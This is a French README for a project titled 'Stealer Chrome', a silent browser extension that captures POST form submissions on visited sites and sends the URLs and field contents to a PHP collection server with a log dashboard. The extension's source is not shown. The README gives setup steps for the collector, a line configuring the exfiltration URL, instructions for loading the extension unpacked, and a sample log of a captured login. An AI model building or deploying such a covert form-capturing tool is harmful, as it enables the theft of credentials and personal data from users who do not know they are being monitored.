# 🛡️ Stealer Chrome

Extension Chrome silencieuse qui capture les soumissions de formulaires POST et envoie les logs (URL + contenu des champs) à un serveur PHP.

## 📦 Contenu

```
siem-extension/
├── manifest.json    # Config extension
├── background.js    # Envoi vers serveur (URL hardcodée)
├── content.js       # Capture des formulaires
├── index.php        # Serveur + Dashboard
└── icons/           # Icônes
```

## 🚀 Installation

### 1. Serveur PHP

Copiez `index.php` sur votre serveur web :

```bash
# Exemple Apache
cp index.php /var/www/html/siem/
mkdir /var/www/html/siem/logs
chmod 755 /var/www/html/siem/logs
```

URL du serveur : `http://votre-serveur/siem/index.php`

### 2. Extension Chrome

1. Modifiez l'URL dans `background.js` :
   ```javascript
   const SIEM_URL = 'http://votre-serveur/index.php';
   ```

2. Chargez l'extension :
   - Ouvrez `chrome://extensions/`
   - Activez **Mode développeur**
   - Cliquez **Charger l'extension non empaquetée**
   - Sélectionnez le dossier `siem-extension`

## 📊 Dashboard

Accédez au dashboard : `http://votre-serveur/index.php`

- Vue des logs en temps réel
- Export JSON : `?api=1`
- Vider les logs : bouton 🗑️

## 📝 Format des logs

```json
{
  "id": "form_1234567890_abc123",
  "timestamp": "2024-01-18T12:00:00.000Z",
  "url": "https://site.com/login",
  "page": {
    "url": "https://site.com/login",
    "hostname": "site.com",
    "title": "Connexion"
  },
  "form": {
    "method": "POST",
    "action": "https://site.com/auth",
    "is_cross_domain": false
  },
  "form_data": {
    "email": "user@example.com",
    "password": "[PASSWORD: 8 chars]"
  },
  "client_ip": "192.168.1.100"
}
```
